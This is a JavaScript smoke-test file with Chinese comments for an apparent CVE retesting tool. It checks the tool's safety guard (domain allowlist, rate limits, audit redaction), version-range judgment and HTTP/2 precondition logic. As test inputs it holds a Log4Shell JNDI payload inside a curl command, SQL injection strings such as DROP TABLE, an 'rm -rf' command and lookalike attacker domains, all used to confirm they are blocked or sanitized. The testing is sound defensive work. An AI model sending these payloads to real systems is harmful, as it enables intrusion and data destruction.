/**
 * 纯逻辑测试（不联网）：安全护栏、版本比较与判读、情报缓存、
 * 复现文档解析、载荷安全化、指标校验、目标解析与指引文本。
 *
 * 测试对象是**构建产物** `lib/`（即安装后真正被加载的代码），因此无需任何
 * Node 特性开关，Node ≥18 都能跑。先构建再跑：`npm run build && node test/smoke.mjs`，
 * 或直接用 `npm test`（pretest 会自动构建）。
 */
import assert from 'node:assert/strict'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { resolveConfig } from '../lib/config.js'
import { SafetyGuard, SafetyBlockedError } from '../lib/core/safety.js'
import { emptyTlsIntel } from '../lib/core/tls.js'
import { hasExplicitScheme, hostOf, resolveTargetInput, swapScheme } from '../lib/core/url.js'
import { buildGuidanceText } from '../lib/prompt.js'
import { IntelCache } from '../lib/core/cache.js'
import {
  IntelJudge,
  assessHttp2Precondition,
  compareVersions,
  findIntelComponent,
  isVersionInRange,
  requiresHttp2,
} from '../lib/core/judge.js'
import { extractProtocolHints } from '../lib/sources/fingerprint.js'
import {
  parseReproDoc,
  parseReproJson,
  parseReproMarkdown,
  sanitizePayload,
  verifyIndicators,
} from '../lib/core/pentest.js'
import { parseCpe, parseVersionRangeString } from '../lib/sources/nvd.js'

let passed = 0
function check(name, fn) {
  fn()
  passed += 1
  console.log(`  ok  ${name}`)
}

console.log('safety guard')

check('域名白名单按主机名精确/后缀匹配，不被相似域名绕过', () => {
  const cfg = resolveConfig({ allowedDomains: ['example.com', 'example.org'] })
  const guard = new SafetyGuard(cfg)
  assert.equal(guard.isDomainAllowed('https://portal.example.com/api'), true)
  assert.equal(guard.isDomainAllowed('https://example.com/'), true)
  assert.equal(guard.isDomainAllowed('https://example.org/x'), true)
  // 子串包含式判断（`domain in url`）会被下面两个绕过
  assert.equal(guard.isDomainAllowed('https://example.com.attacker.com/'), false)
  assert.equal(guard.isDomainAllowed('https://evil.com/?x=example.com'), false)
})

check('破坏性载荷被拦截且不消耗配额', () => {
  const cfg = resolveConfig({ allowedDomains: ['t.com'] })
  const guard = new SafetyGuard(cfg)
  const blocked = guard.check('http_probe', { url: 'https://t.com', body: 'DROP TABLE users' })
  assert.equal(blocked.allowed, false)
  assert.match(blocked.reason, /禁止模式/)
  assert.equal(guard.usedRequests, 0)
})

check('非白名单目标被拦截，白名单目标通过并计数', () => {
  const cfg = resolveConfig({ allowedDomains: ['t.com'] })
  const guard = new SafetyGuard(cfg)
  assert.equal(guard.check('http_probe', { url: 'https://other.com' }).allowed, false)
  assert.equal(guard.check('http_probe', { url: 'https://t.com' }).allowed, true)
  assert.equal(guard.usedRequests, 1)
  const report = guard.report()
  assert.equal(report.totalCalls, 2)
  assert.equal(report.blockedCalls, 1)
})

check('速率限制与审计脱敏生效', () => {
  const cfg = resolveConfig({ allowedDomains: [], maxRequestsPerMinute: 2 })
  const guard = new SafetyGuard(cfg)
  assert.equal(guard.check('cve_lookup', { cve_id: 'CVE-2021-44228' }).allowed, true)
  assert.equal(guard.check('cve_lookup', { cve_id: 'CVE-2021-44228' }).allowed, true)
  const third = guard.check('cve_lookup', { cve_id: 'CVE-2021-44228' })
  assert.equal(third.allowed, false)
  assert.match(third.reason, /速率限制/)

  const cfg2 = resolveConfig({ allowedDomains: [] })
  const guard2 = new SafetyGuard(cfg2)
  guard2.check('http_probe', { url: 'https://a.com', headers: { authorization: 'Bearer secret' } })
  const log = guard2.report().log[0]
  assert.equal(log.params.headers.authorization, '***REDACTED***')
})

check('破坏性工具名被拦截', () => {
  const guard = new SafetyGuard(resolveConfig({ allowedDomains: [] }))
  assert.equal(guard.check('exec_command', {}).allowed, false)
})

console.log('version compare / judge')

check('版本比较覆盖多段与预发布', () => {
  assert.equal(compareVersions('1.2.83', '1.2.80'), 1)
  assert.equal(compareVersions('1.2.8', '1.2.83'), -1)
  assert.equal(compareVersions('2.11.1', '2.11.1'), 0)
  assert.equal(compareVersions('1.2.0-rc1', '1.2.0'), -1)
  assert.equal(compareVersions('2.4.49', '2.4.50'), -1)
})

check('区间比较区分开闭区间', () => {
  assert.equal(isVersionInRange('1.2.80', { start: '1.2.0', end: '1.2.83', endInclusive: false }), true)
  assert.equal(isVersionInRange('1.2.83', { start: '1.2.0', end: '1.2.83', endInclusive: false }), false)
  assert.equal(isVersionInRange('1.2.83', { start: '1.2.0', end: '1.2.83', endInclusive: true }), true)
})

check('CPE 解析与 GitHub 范围串解析', () => {
  const cpe = parseCpe('cpe:2.3:a:apache:http_server:2.4.49:*:*:*:*:*:*:*')
  assert.equal(cpe.vendor, 'apache')
  assert.equal(cpe.product, 'http_server')
  assert.equal(cpe.version, '2.4.49')

  assert.deepEqual(parseVersionRangeString('>= 1.2.0, < 1.2.84'), {
    start: '1.2.0',
    end: '1.2.84',
    endInclusive: false,
  })
  assert.deepEqual(parseVersionRangeString('= 0.2.15'), {
    start: '0.2.15',
    end: '0.2.15',
    endInclusive: true,
  })
})

check('组件名别名匹配 (CPE http_server -> 指纹 Apache)', () => {
  const intel = {
    targetUrl: 'https://x',
    server: 'Apache/2.4.49 (Unix)',
    framework: null,
    techStack: [{ name: 'Apache', version: '2.4.49', category: 'server', confidence: 0.9 }],
    wafDetected: false,
    wafVendor: null,
    lastScanned: new Date().toISOString(),
    scanStatus: 'complete',
    scanDurationMs: 1,
    allowedMethods: [],
    errorPageSignature: null,
  }
  const matched = findIntelComponent(intel, 'http_server')
  assert.equal(matched.version, '2.4.49')
})

check('短组件名不做子串匹配（回归：CPE nx 曾被误判为 nginx）', () => {
  const intel = {
    targetUrl: 'https://x',
    server: 'nginx/1.18.0',
    framework: null,
    techStack: [{ name: 'Nginx', version: '1.18.0', category: 'server', confidence: 0.9 }],
    wafDetected: false,
    wafVendor: null,
    lastScanned: new Date().toISOString(),
    scanStatus: 'complete',
    scanDurationMs: 1,
    allowedMethods: [],
    errorPageSignature: null,
  }
  assert.equal(findIntelComponent(intel, 'nx'), null)
  assert.equal(findIntelComponent(intel, 'ip'), null)
  assert.ok(findIntelComponent(intel, 'nginx'))
})

check('CPE 通配版本解析为 null 而不是空串（空串会让区间判断被静默跳过）', () => {
  assert.equal(parseCpe('cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*').version, null)
  assert.equal(parseCpe('cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*').version, '2.14.1')
})

check('判读：版本不在区间直接排除，命中区间则需实证', () => {
  const judge = new IntelJudge()
  const intel = {
    targetUrl: 'https://x',
    server: 'nginx/1.18.0',
    framework: null,
    techStack: [{ name: 'fastjson', version: '1.2.83', category: 'framework', confidence: 0.8 }],
    wafDetected: false,
    wafVendor: null,
    lastScanned: new Date().toISOString(),
    scanStatus: 'complete',
    scanDurationMs: 1,
    allowedMethods: [],
    errorPageSignature: null,
  }

  const notAffected = judge.judge(
    {
      cveId: 'CVE-2022-25845',
      description: '',
      cvssScore: 9.8,
      severity: 'CRITICAL',
      affectedProducts: [
        { component: 'fastjson', versionStart: null, versionEnd: '1.2.80', versionEndInclusive: true, criteria: null, ecosystem: null },
      ],
      references: [],
      source: 'NVD',
    },
    intel,
  )
  assert.equal(notAffected.applicable, 'no')
  assert.equal(notAffected.skipRecon, true)

  const affected = judge.judge(
    {
      cveId: 'CVE-2022-25845',
      description: '',
      cvssScore: 9.8,
      severity: 'CRITICAL',
      affectedProducts: [
        { component: 'fastjson', versionStart: '1.2.0', versionEnd: '1.2.84', versionEndInclusive: false, criteria: null, ecosystem: null },
      ],
      references: [],
      source: 'NVD',
    },
    intel,
  )
  assert.equal(affected.applicable, 'yes')
  assert.equal(affected.skipRecon, false)

  const unknown = judge.judge(
    {
      cveId: 'CVE-2020-0001',
      description: '',
      cvssScore: null,
      severity: null,
      affectedProducts: [],
      references: [],
      source: 'none',
    },
    intel,
  )
  assert.equal(unknown.applicable, 'uncertain')
})

console.log('intel cache')
{
  const dir = await mkdtemp(join(tmpdir(), 'cvescout-'))
  const cache = new IntelCache(join(dir, 'intel.json'), 24)
  const intel = {
    targetUrl: 'https://portal.example.com/',
    server: 'nginx/1.18.0',
    framework: null,
    techStack: [],
    wafDetected: false,
    wafVendor: null,
    lastScanned: new Date().toISOString(),
    scanStatus: 'complete',
    scanDurationMs: 12,
    allowedMethods: ['GET', 'HEAD'],
    errorPageSignature: 'HTTP 404',
  }
  await cache.set(intel)
  const hit = await cache.get('https://portal.example.com')
  assert.ok(hit)
  assert.equal(hit.server, 'nginx/1.18.0')
  assert.equal((await cache.list()).length, 1)

  // 过期后不可命中
  const stale = new IntelCache(join(dir, 'intel.json'), -1)
  assert.equal(await stale.get('https://portal.example.com/'), null)

  assert.equal(await cache.invalidate('https://portal.example.com/'), true)
  assert.equal(await cache.get('https://portal.example.com'), null)
  await rm(dir, { recursive: true, force: true })
  passed += 1
  console.log('  ok  缓存 set/get/TTL/失效')
}

console.log('pentest parsing / payload / indicators')

check('Markdown 复现文档解析出步骤、curl、指标与破坏性标记', () => {
  const doc = parseReproMarkdown(
    `# CVE-2021-44228 复现

## 描述
log4j2 JNDI 注入。

影响组件：log4j-core
影响版本：2.0-beta9 ~ 2.14.1

## 复现步骤
1. 发送带 payload 的请求
   curl -X POST 'https://t.com/api/login' -H 'Content-Type: application/json' -d '{"user":"\${jndi:ldap://x/a}"}'
   成功指标: 200, ldap

2. 清理数据库
   DROP TABLE audit_log
`,
    'CVE-2021-44228',
  )
  assert.equal(doc.title, 'CVE-2021-44228 复现')
  assert.equal(doc.affectedComponent, 'log4j-core')
  assert.equal(doc.steps.length, 2)
  assert.equal(doc.steps[0].httpMethod, 'POST')
  assert.equal(doc.steps[0].endpoint, 'https://t.com/api/login')
  assert.equal(doc.steps[0].headers['Content-Type'], 'application/json')
  assert.deepEqual(doc.steps[0].expectedIndicators, ['200', 'ldap'])
  assert.equal(doc.steps[0].isDestructive, false)
  assert.equal(doc.steps[1].isDestructive, true)
})

check('JSON 复现文档解析并识别破坏性步骤', () => {
  const doc = parseReproJson(
    JSON.stringify({
      title: 'demo',
      affected_component: 'mchange-commons-java',
      steps: [
        { description: '探测接口', method: 'get', endpoint: '/api/x', indicators: ['200'] },
        { description: '删除测试数据', method: 'DELETE', endpoint: '/api/x' },
      ],
    }),
    'CVE-2020-36518',
  )
  assert.equal(doc.steps[0].httpMethod, 'GET')
  assert.equal(doc.steps[0].isDestructive, false)
  assert.equal(doc.steps[1].isDestructive, true)
})

check('自动识别格式', () => {
  const asJson = parseReproDoc('{"title":"a","steps":[]}', 'CVE-2020-1')
  assert.equal(asJson.title, 'a')
  const asMd = parseReproDoc('# b\n', 'CVE-2020-1')
  assert.equal(asMd.title, 'b')
})

check('载荷安全化替换危险命令并保留追踪标记', () => {
  const rce = sanitizePayload('bash -c "rm -rf /tmp/x"')
  assert.equal(rce.isSafe, true)
  assert.ok(!/rm\s+-rf/.test(rce.safeVersion))

  const sqli = sanitizePayload("1'; DROP TABLE users; --")
  assert.equal(sqli.isSafe, true)
  assert.ok(!/drop\s+table/i.test(sqli.safeVersion))

  const benign = sanitizePayload('{"q":"hello"}')
  assert.equal(benign.isSafe, true)
  assert.equal(benign.safeVersion, '{"q":"hello"}')
})

check('成功指标校验逻辑', () => {
  assert.equal(verifyIndicators([], 200, ''), true)
  assert.equal(verifyIndicators([], 404, ''), false)
  assert.equal(verifyIndicators(['200'], 200, ''), true)
  assert.equal(verifyIndicators(['302'], 200, ''), false)
  assert.equal(verifyIndicators(['token'], 200, '{"token":"x"}'), true)
  assert.equal(verifyIndicators(['token'], 200, '{"a":1}'), false)
})

console.log('target resolution / safety scope')

check('裸域名、host:port、中文标点都能解析成绝对 URL', () => {
  assert.equal(resolveTargetInput('portal.example.com'), 'https://portal.example.com/')
  assert.equal(resolveTargetInput('  portal.example.com  '), 'https://portal.example.com/')
  assert.equal(resolveTargetInput('https://portal.example.com。'), 'https://portal.example.com/')
  assert.equal(resolveTargetInput('`https://example.org/a?b=c`'), 'https://example.org/a?b=c')
  assert.equal(resolveTargetInput('127.0.0.1:5000'), 'https://127.0.0.1:5000/')
  assert.equal(resolveTargetInput('portal.example.com/api/x', { defaultScheme: 'http' }), 'http://portal.example.com/api/x')
})

check('嵌在句子里的 URL 也能被抠出来', () => {
  assert.equal(resolveTargetInput('帮我看看 https://portal.example.com/a 这个站点'), 'https://portal.example.com/a')
})

check('别名表把系统名解析成域名', () => {
  const options = { aliases: { 内部管理系统: 'erp.example.com', gateway: 'example.org' } }
  assert.equal(resolveTargetInput('内部管理系统', options), 'https://erp.example.com/')
  assert.equal(resolveTargetInput('GATEWAY', options), 'https://example.org/')
  // 未配置别名时不能瞎猜：非 ASCII 名字会走 IDN 编码，这本身就该由别名表覆盖。
  assert.match(resolveTargetInput('未知系统', options), /^https:\/\/xn--/)
})

check('非法协议与空输入被拒绝', () => {
  assert.throws(() => resolveTargetInput('ftp://portal.example.com'), /仅支持 http\/https/)
  assert.throws(() => resolveTargetInput('   '), /目标为空/)
})

check('hasExplicitScheme / swapScheme / hostOf', () => {
  assert.equal(hasExplicitScheme('portal.example.com'), false)
  assert.equal(hasExplicitScheme('https://portal.example.com'), true)
  assert.equal(hasExplicitScheme('portal.example.com:8080'), false)
  assert.equal(swapScheme('https://a.cn/x'), 'http://a.cn/x')
  assert.equal(swapScheme('http://a.cn/x'), 'https://a.cn/x')
  assert.equal(hostOf('portal.example.com'), 'portal.example.com')
  assert.equal(hostOf('portal.example.com:8080'), 'portal.example.com')
  assert.equal(hostOf('https://portal.example.com/x'), 'portal.example.com')
  assert.equal(hostOf(''), null)
})

check('护栏接受裸域名，且拦截信息可执行（回归：裸域名曾被判越权）', () => {
  const cfg = resolveConfig({ allowedDomains: ['example.com'], defaultScheme: 'http' })
  const guard = new SafetyGuard(cfg)
  assert.equal(guard.isDomainAllowed('portal.example.com'), true)
  assert.equal(guard.isDomainAllowed('portal.example.com:8080'), true)
  assert.equal(guard.isDomainAllowed('portal.example.com.attacker.com'), false)

  const decision = guard.check('http_probe', { url: 'https://other.cn' })
  assert.equal(decision.allowed, false)
  assert.match(decision.reason, /不在授权范围内/)
  assert.match(decision.reason, /allowedDomains/)
  assert.match(decision.reason, /当前授权域名：example\.com/)
})

console.log('system prompt guidance')

check('指引文本包含触发话术、流程与当前授权范围', () => {
  const cfg = resolveConfig({
    allowedDomains: ['portal.example.com', 'erp.example.com'],
    targetAliases: { 内部管理系统: 'erp.example.com' },
  })
  const text = buildGuidanceText({ cfg, safety: new SafetyGuard(cfg) })
  assert.match(text, /cve_retest/)
  assert.match(text, /target_scope/)
  assert.match(text, /帮我排查|排查/)
  assert.match(text, /UNCERTAIN/)
  assert.match(text, /portal\.example\.com、erp\.example\.com/)
  assert.match(text, /内部管理系统 → erp\.example\.com/)
  assert.match(text, /不投递攻击载荷/)
})

check('未配置白名单时，指引会明确提醒补配置', () => {
  const cfg = resolveConfig({})
  const text = buildGuidanceText({ cfg, safety: new SafetyGuard(cfg) })
  assert.match(text, /未配置授权域名白名单/)
  assert.match(text, /targetAliases/)
})

console.log('\n协议前置条件（HTTP/2）')

/** 构造一份最小可用的目标情报。 */
function makeIntel(overrides = {}) {
  return {
    targetUrl: 'https://portal.example.com',
    server: 'nginx/1.18.0',
    framework: null,
    techStack: [{ name: 'Nginx', version: '1.18.0', category: 'server', confidence: 0.9 }],
    wafDetected: false,
    wafVendor: null,
    lastScanned: new Date().toISOString(),
    scanStatus: 'complete',
    scanDurationMs: 1,
    allowedMethods: [],
    errorPageSignature: null,
    tls: null,
    protocolHints: null,
    ...overrides,
  }
}

/** 构造一份 TLS 探测结果。 */
function tlsStub({ ok = true, http2 = false, alpn = 'http/1.1' } = {}) {
  const base = emptyTlsIntel(null)
  const negotiated = alpn !== null
  return {
    ...base,
    ok,
    alpnProtocol: alpn,
    alpnNegotiated: negotiated,
    http2,
    http2Evidence: http2
      ? 'ALPN 协商为 h2，该入口提供 HTTP/2 over TLS'
      : negotiated
        ? `ALPN 协商为 ${alpn}，未提供 h2，该入口不支持 HTTP/2 over TLS`
        : '服务器未在 ALPN 中选中任何协议，该入口不支持 HTTP/2 over TLS',
  }
}

const cve44487 = {
  cveId: 'CVE-2023-44487',
  description: 'HTTP/2 Rapid Reset 可导致拒绝服务',
  cvssScore: 7.5,
  severity: 'HIGH',
  affectedProducts: [
    {
      component: 'nginx',
      versionStart: null,
      versionEnd: '1.25.3',
      versionEndInclusive: false,
      criteria: null,
      ecosystem: null,
    },
  ],
  references: [],
  source: 'test',
}

check('已知 HTTP/2 条目被识别为需要该前置条件', () => {
  const result = requiresHttp2(cve44487)
  assert.equal(result.required, true)
  assert.ok(result.basis)
})

check('与本协议无关的 CVE 不会被误判为需要 HTTP/2', () => {
  assert.equal(
    requiresHttp2({ ...cve44487, cveId: 'CVE-2021-44228', description: 'Log4j2 JNDI 注入' }).required,
    false,
  )
})

check('描述同时含 HTTP/2 与拒绝服务语义时按需要 HTTP/2 处理', () => {
  const cve = { ...cve44487, cveId: 'CVE-2099-0001', description: 'HTTP/2 CONTINUATION flood causes denial of service' }
  assert.equal(requiresHttp2(cve).required, true)
})

check('仅提到 HTTP/2 但不涉及拒绝服务时，不按需要 HTTP/2 处理', () => {
  const cve = { ...cve44487, cveId: 'CVE-2099-0002', description: 'HTTP/2 请求解析越界可导致信息泄露' }
  assert.equal(requiresHttp2(cve).required, false)
})

check('ALPN 未协商出 h2 → 前置条件证伪', () => {
  const precondition = assessHttp2Precondition(cve44487, makeIntel({ tls: tlsStub({ http2: false }) }))
  assert.equal(precondition.status, 'violated')
  assert.match(precondition.detail, /不支持 HTTP\/2 over TLS/)
})

check('ALPN 协商出 h2 → 前置条件满足', () => {
  const precondition = assessHttp2Precondition(cve44487, makeIntel({ tls: tlsStub({ http2: true, alpn: 'h2' }) }))
  assert.equal(precondition.status, 'satisfied')
})

check('Alt-Svc 广告 h2 也能证明前置条件满足', () => {
  const intel = makeIntel({
    tls: null,
    protocolHints: { altSvc: 'h3=":443"; h2=":443"', http2Advertised: true, viaProxy: null },
  })
  assert.equal(assessHttp2Precondition(cve44487, intel).status, 'satisfied')
})

check('没有 TLS 情报（旧缓存）→ 前置条件未知，而不是「不支持」', () => {
  const precondition = assessHttp2Precondition(cve44487, makeIntel({ tls: null, protocolHints: null }))
  assert.equal(precondition.status, 'unknown')
})

check('协议能力未知时不得据此排除', () => {
  const judgment = new IntelJudge().judge(cve44487, makeIntel({ tls: null, protocolHints: null }))
  assert.equal(judgment.applicable, 'yes', '未知不等于不支持，版本命中区间应判适用')
  assert.match(judgment.reason, /协议能力未知/)
})

check('版本命中但实测不支持 HTTP/2 → 判为不适用（protocol 依据）', () => {
  const judgment = new IntelJudge().judge(
    cve44487,
    makeIntel({ tls: tlsStub({ http2: false }), protocolHints: { altSvc: null, http2Advertised: false, viaProxy: null } }),
  )
  assert.equal(judgment.applicable, 'no')
  assert.equal(judgment.exclusionBasis, 'protocol')
  assert.equal(judgment.skipRecon, true)
  assert.match(judgment.reason, /协议前置条件/)
})

check('版本明确落在区间外时，仍以版本为依据（不被协议结论覆盖）', () => {
  const intel = makeIntel({
    server: 'nginx/1.26.0',
    techStack: [{ name: 'Nginx', version: '1.26.0', category: 'server', confidence: 0.9 }],
    tls: tlsStub({ http2: true, alpn: 'h2' }),
  })
  const judgment = new IntelJudge().judge(cve44487, intel)
  assert.equal(judgment.applicable, 'no')
  assert.equal(judgment.exclusionBasis, 'version')
})

check('Alt-Svc 解析：识别 h2 广告与前置代理', () => {
  const hints = extractProtocolHints({
    'alt-svc': 'h3=":443"; ma=86400, h2=":443"',
    via: '1.1 uproxy-2',
  })
  assert.equal(hints.http2Advertised, true)
  assert.equal(hints.viaProxy, '1.1 uproxy-2')

  const none = extractProtocolHints({ via: '1.1 squid' })
  assert.equal(none.http2Advertised, false)
  assert.equal(none.altSvc, null)
})

check('h3 单独出现时不会被误判为 h2', () => {
  assert.equal(extractProtocolHints({ 'alt-svc': 'h3=":443"; ma=86400' }).http2Advertised, false)
})

check('emptyTlsIntel 的默认语义是「未探测」而不是「不支持 HTTP/2」', () => {
  const empty = emptyTlsIntel('未执行')
  assert.equal(empty.ok, false)
  assert.equal(empty.http2, false)
  assert.match(empty.http2Evidence, /未完成|未执行/)
})

console.log('\n配置与护栏的增量字段')

check('新增 tlsProbe / probeConcurrency 有安全默认值', () => {
  const cfg = resolveConfig({})
  assert.equal(cfg.tlsProbe, true)
  assert.equal(cfg.probeConcurrency, 6)
})

check('probeConcurrency 被夹在 1..32 之间', () => {
  assert.equal(resolveConfig({ probeConcurrency: 0 }).probeConcurrency, 1)
  assert.equal(resolveConfig({ probeConcurrency: 999 }).probeConcurrency, 32)
  assert.equal(resolveConfig({ probeConcurrency: 3.6 }).probeConcurrency, 4)
})

check('护栏区分「越权」与「配额用尽」，便于并行探测分而治之', () => {
  const cfg = resolveConfig({ allowedDomains: ['example.com'], maxRequestsPerMinute: 1 })
  const guard = new SafetyGuard(cfg)

  const scoped = guard.check('http_probe', { url: 'https://other.example.net/' })
  assert.equal(scoped.allowed, false)
  assert.equal(scoped.kind, 'scope')

  assert.equal(guard.check('http_probe', { url: 'https://example.com/' }).allowed, true)
  const limited = guard.check('http_probe', { url: 'https://example.com/' })
  assert.equal(limited.allowed, false)
  assert.equal(limited.kind, 'rate-limit')
})

check('只有越权类拦截会标记为必须硬失败', () => {
  const cfg = resolveConfig({ allowedDomains: ['example.com'], maxRequestsPerMinute: 1 })
  const guard = new SafetyGuard(cfg)

  try {
    guard.assertAllowed('http_probe', { url: 'https://not-allowed.example.net/' })
    assert.fail('越权目标应抛错')
  } catch (error) {
    assert.ok(error instanceof SafetyBlockedError)
    assert.equal(error.isScopeViolation, true)
  }

  guard.check('http_probe', { url: 'https://example.com/' })
  try {
    guard.assertAllowed('http_probe', { url: 'https://example.com/' })
    assert.fail('超速应抛错')
  } catch (error) {
    assert.ok(error instanceof SafetyBlockedError)
    assert.equal(error.isScopeViolation, false, '配额类拦截不应被当作越权硬失败')
  }
})

console.log(`\n全部 ${passed} 项冒烟测试通过`)
